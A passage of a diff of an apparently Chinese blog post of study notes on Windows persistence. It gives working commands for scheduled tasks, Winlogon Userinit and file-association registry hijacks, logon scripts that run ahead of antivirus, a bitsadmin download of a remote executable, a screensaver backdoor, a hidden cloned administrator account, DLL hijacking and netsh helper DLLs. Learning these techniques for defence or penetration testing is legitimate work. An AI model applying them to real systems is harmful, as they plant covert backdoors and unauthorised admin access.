+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
 <p>Windows实现定时任务主要有schtasks与at二种方式:</p>
 <p>At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后</p>
 </blockquote>
@@ -204,8 +221,11 @@ sc start pentestlab</code></pre><p><img loading="lazy" src="/posts/windows%E6%9D
 <p>5min执行一次</p>
 <p><code>schtasks /create /sc minute /mo 5   /tn &quot;aaaa&quot; /tr C:\Windows\System32\cmd.exe</code></p>
 <p><img loading="lazy" src="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308182919522.png" alt="image-20220308182919522" srcset="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308182919522.png?size=small, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308182919522.png?size=medium 1.5x, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308182919522.png?size=large 2x" data-title="image-20220308182919522" style="--width: 998px;--aspect-ratio: 998 / 469;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h2 id="0x4dll劫持" class="heading-element">
-  <a href="#0x4dll%e5%8a%ab%e6%8c%81" class="heading-mark"></a>0x4.DLL劫持</h2><blockquote>
+<h2 id="0x4dll劫持" class="heading-element"><span>0x4.DLL劫持</span>
+  <a href="#0x4dll%e5%8a%ab%e6%8c%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
 <p>DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代 码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。</p>
 <ol>
 <li>程序所在⽬录。</li>
@@ -219,25 +239,37 @@ sc start pentestlab</code></pre><p><img loading="lazy" src="/posts/windows%E6%9D
 </blockquote>
 <p>在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持：</p>
 <pre tabindex="0"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls</code></pre><p><a href="https://www.anquanke.com/post/id/225911"target="_blank" rel="external nofollow noopener noreferrer">DLL劫持原理及其漏洞挖掘（一）</a></p>
-<h2 id="0x5winlogon用户登录初始化" class="heading-element">
-  <a href="#0x5winlogon%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95%e5%88%9d%e5%a7%8b%e5%8c%96" class="heading-mark"></a>0x5.Winlogon用户登录初始化</h2><p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:</p>
+<h2 id="0x5winlogon用户登录初始化" class="heading-element"><span>0x5.Winlogon用户登录初始化</span>
+  <a href="#0x5winlogon%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95%e5%88%9d%e5%a7%8b%e5%8c%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:</p>
 <pre tabindex="0"><code>HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\
 HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code></pre><p>命令行:</p>
 <pre tabindex="0"><code>reg delete &#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34; /v Userinit /f
 reg add &#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;  /v &#34;Userinit&#34; /t REG_SZ /d &#34;C:\Windows\system32\cmd.exe,&#34; /f</code></pre><p>powershell：</p>
 <pre tabindex="0"><code>Set-ItemProperty   &#34;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&#34; -name   Userinit -value &#34;C:\Windows\system32\userinit.exe,C:\Windows\system32\cmd.exe&#34;</code></pre><p><img loading="lazy" src="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184001989.png" alt="image-20220308184001989" srcset="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184001989.png?size=small, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184001989.png?size=medium 1.5x, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184001989.png?size=large 2x" data-title="image-20220308184001989" style="--width: 1278px;--aspect-ratio: 1278 / 769;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h2 id="0x6logon-scripts后门" class="heading-element">
-  <a href="#0x6logon-scripts%e5%90%8e%e9%97%a8" class="heading-mark"></a>0x6.Logon Scripts后门</h2><p>Windows登录脚本，当用户登录时触发，<strong>Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截</strong>。</p>
+<h2 id="0x6logon-scripts后门" class="heading-element"><span>0x6.Logon Scripts后门</span>
+  <a href="#0x6logon-scripts%e5%90%8e%e9%97%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Windows登录脚本，当用户登录时触发，<strong>Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截</strong>。</p>
 <p>注册表位置:</p>
 <pre tabindex="0"><code>HKEY_CURRENT_USER\Environment</code></pre><p><img loading="lazy" src="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184533410.png" alt="image-20220308184533410" srcset="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184533410.png?size=small, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184533410.png?size=medium 1.5x, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184533410.png?size=large 2x" data-title="image-20220308184533410" style="--width: 1233px;--aspect-ratio: 1233 / 511;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h2 id="0x7文件关联" class="heading-element">
-  <a href="#0x7%e6%96%87%e4%bb%b6%e5%85%b3%e8%81%94" class="heading-mark"></a>0x7.文件关联</h2><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。</p>
+<h2 id="0x7文件关联" class="heading-element"><span>0x7.文件关联</span>
+  <a href="#0x7%e6%96%87%e4%bb%b6%e5%85%b3%e8%81%94" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。</p>
 <p>可以用assoc命令显示或修改文件扩展名关联，使用ftype显示或修改文件类型</p>
 <p><img loading="lazy" src="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185550636.png" alt="image-20220308185550636" srcset="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185550636.png?size=small, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185550636.png?size=medium 1.5x, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185550636.png?size=large 2x" data-title="image-20220308185550636" style="--width: 521px;--aspect-ratio: 521 / 198;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>需要管理员权限</p>
 <pre tabindex="0"><code>reg add &#34;HKCR\txtfile\shell\open\command&#34; /ve /t REG_EXPAND_SZ /d &#34;C:\Windows\system32\cmd.exe %1&#34; /f</code></pre><p><img loading="lazy" src="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185838423.png" alt="image-20220308185838423" srcset="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185838423.png?size=small, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185838423.png?size=medium 1.5x, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185838423.png?size=large 2x" data-title="image-20220308185838423" style="--width: 982px;--aspect-ratio: 982 / 480;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h2 id="0x8bitsadmin" class="heading-element">
-  <a href="#0x8bitsadmin" class="heading-mark"></a>0x8.Bitsadmin</h2><blockquote>
+<h2 id="0x8bitsadmin" class="heading-element"><span>0x8.Bitsadmin</span>
+  <a href="#0x8bitsadmin" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
 <p><a href="https://toutiao.io/posts/bcz5e1o/preview"target="_blank" rel="external nofollow noopener noreferrer">BITSAdmin的介绍与Windows渗透测试中的使用</a></p>
 <p><a href="https://micro8.gitbook.io/micro8/contents-1/41-50/41bitsadmin-yi-ju-hua-xia-zai-payload"target="_blank" rel="external nofollow noopener noreferrer">bitsadmin一句话下载payload</a></p>
 </blockquote>
@@ -248,13 +280,16 @@ reg add &#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;  /v
 <p>使用功能transfer参数下载</p>
 <pre tabindex="0"><code>.\bitsadmin.exe /transfer backdoor &#34;http://sssssssss/CM.EXE&#34; C:\1.exe</code></pre><p>复制本地文件：</p>
 <p>BITSAdmin遵循文件传输的原则。因此，可以将其用作复制和粘贴命令。这意味着BITSAdmin也能将同一台计算机上的一个位置传输到另一个位置。</p>
-<div class="highlight" id="id-17"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bitsadmin /create whitehat_day <span class="c1">#创建一个whitehat_day的任务。</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bitsadmin /create whitehat_day <span class="c1">#创建一个whitehat_day的任务。</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##使用/addfile参数将传输文件添加到whitehat_day任务中，并声明传输的文件名与路径，和保存位置与名称</span>
 </span></span><span class="line"><span class="cl">bitsadmin /addfile whitehat_day d:<span class="se">\f</span>ile.txt d:<span class="se">\t</span>estfile.txt
 </span></span><span class="line"><span class="cl">bitsadmin /resume whitehat_day#使用/resume参数来开启传输。
 </span></span><span class="line"><span class="cl">bitsadmin /complete whitehat_day#以临时文件的形式传输文件。要获取完整的文件，需要使用/complete参数
-</span></span><span class="line"><span class="cl">Get-ChildItem -Path d:<span class="se">\ </span> <span class="c1">#查看目标路径下是否存在file.txt</span></span></span></code></pre></div><h2 id="0x9屏幕保护程序" class="heading-element">
-  <a href="#0x9%e5%b1%8f%e5%b9%95%e4%bf%9d%e6%8a%a4%e7%a8%8b%e5%ba%8f" class="heading-mark"></a>0x9.屏幕保护程序</h2><blockquote>
+</span></span><span class="line"><span class="cl">Get-ChildItem -Path d:<span class="se">\ </span> <span class="c1">#查看目标路径下是否存在file.txt</span></span></span></code></pre></div><h2 id="0x9屏幕保护程序" class="heading-element"><span>0x9.屏幕保护程序</span>
+  <a href="#0x9%e5%b1%8f%e5%b9%95%e4%bf%9d%e6%8a%a4%e7%a8%8b%e5%ba%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
 <p>利用前提:对方开启了屏幕保护</p>
 <p>屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。</p>
 </blockquote>
@@ -267,8 +302,11 @@ reg add &#34;hkcu\control panel\desktop&#34; /v ScreenSaveActive /d 1 /f
 reg add &#34;hkcu\control panel\desktop&#34; /v ScreenSaverIsSecure /d 0 /f
 reg add &#34;hkcu\control panel\desktop&#34; /v ScreenSaveTimeOut /d 60 /f</code></pre><p>如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的，而屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍。另外，经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序。
 当然，从注册表路径也可以看出这种方式只能获得当前用户权限的shell，优点是不需要提权即可维持。</p>
-<h2 id="0xa-wmi构造无文件后门待完成" class="heading-element">
-  <a href="#0xa-wmi%e6%9e%84%e9%80%a0%e6%97%a0%e6%96%87%e4%bb%b6%e5%90%8e%e9%97%a8%e5%be%85%e5%ae%8c%e6%88%90" class="heading-mark"></a>0xA WMI构造无文件后门（待完成）</h2><p>WMI(Windows Management Instrumentation，即Windows管理规范)，大多数基于Windows的软件依赖于此服务。</p>
+<h2 id="0xa-wmi构造无文件后门待完成" class="heading-element"><span>0xA WMI构造无文件后门（待完成）</span>
+  <a href="#0xa-wmi%e6%9e%84%e9%80%a0%e6%97%a0%e6%96%87%e4%bb%b6%e5%90%8e%e9%97%a8%e5%be%85%e5%ae%8c%e6%88%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>WMI(Windows Management Instrumentation，即Windows管理规范)，大多数基于Windows的软件依赖于此服务。</p>
 <blockquote>
 <p><a href="https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html"target="_blank" rel="external nofollow noopener noreferrer">WMI的攻击，防御与取证分析技术之攻击篇</a></p>
 <p><a href="https://xz.aliyun.com/t/2080"target="_blank" rel="external nofollow noopener noreferrer">wmi与vbs</a></p>
@@ -283,8 +321,11 @@ reg add &#34;hkcu\control panel\desktop&#34; /v ScreenSaveTimeOut /d 60 /f</code
 <p><a href="https://www.anquanke.com/post/id/85851"target="_blank" rel="external nofollow noopener noreferrer">解析APT29的无文件WMI和PowerShell后门</a></p>
 <p><a href="https://www.aqniu.com/learn/31053.html"target="_blank" rel="external nofollow noopener noreferrer">无文件攻击的兴起与应对之道</a></p>
 </blockquote>
-<h2 id="0xb影子用户" class="heading-element">
-  <a href="#0xb%e5%bd%b1%e5%ad%90%e7%94%a8%e6%88%b7" class="heading-mark"></a>0xB.影子用户</h2><p>即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。（要管理员）</p>
+<h2 id="0xb影子用户" class="heading-element"><span>0xB.影子用户</span>
+  <a href="#0xb%e5%bd%b1%e5%ad%90%e7%94%a8%e6%88%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。（要管理员）</p>
 <p>创建个隐藏用户</p>
 <pre tabindex="0"><code>net user test$ 123456 /add
 net localgroup administrators test$ /add</code></pre><p>net user无法查看</p>
@@ -300,8 +341,11 @@ net localgroup administrators test$ /add</code></pre><p>net user无法查看</p>
 <p>删除test$用户，之后注册表就 无法打开了，导入1,2注册表：</p>
 <p><img loading="lazy" src="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194707146.png" alt="image-20220308194707146" srcset="/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194707146.png?size=small, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194707146.png?size=medium 1.5x, /posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194707146.png?size=large 2x" data-title="image-20220308194707146" style="--width: 582px;--aspect-ratio: 582 / 131;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>这时登陆界面已经没有账户了，3389可以直接登陆，以test$用户登陆，登陆之后的身份是原来WIN10用户，桌面也是原用户的，达到克隆效果。这个时候再用<code>net user test$ /del</code>是删除不掉这个用户的，只能通过注册表来删除。</p>
-<h2 id="0xcnetsh" class="heading-element">
-  <a href="#0xcnetsh" class="heading-mark"></a>0xC.Netsh</h2><p>权限要求：未降权的管理员权限。
+<h2 id="0xcnetsh" class="heading-element"><span>0xC.Netsh</span>
+  <a href="#0xcnetsh" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>权限要求：未降权的管理员权限。
 netsh也是Windows自带的命令，是用来配置网络的命令行工具。该工具可以通过导入helperdll的方式实现功能，且DLL导入后会写进注册表，永久有效.</p>
 <p>关于<code>helper dll</code>的编写可以参考这个项目：<a href="https://github.com/outflanknl/NetshHelperBeacon"target="_blank" rel="external nofollow noopener noreferrer">NetshHelperBeacon</a></p>
 <p>注册表位置：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></p>
@@ -323,9 +367,9 @@ netsh也是Windows自带的命令，是用来配置网络的命令行工具。�
           </div></div><div class="post-info-line">
         <div class="post-info-md"></div>
         <div class="post-info-share">
-          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" data-title="Windows权限维持学习" data-hashtags="渗透"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" data-hashtag="渗透"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/" data-title="Windows权限维持学习"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
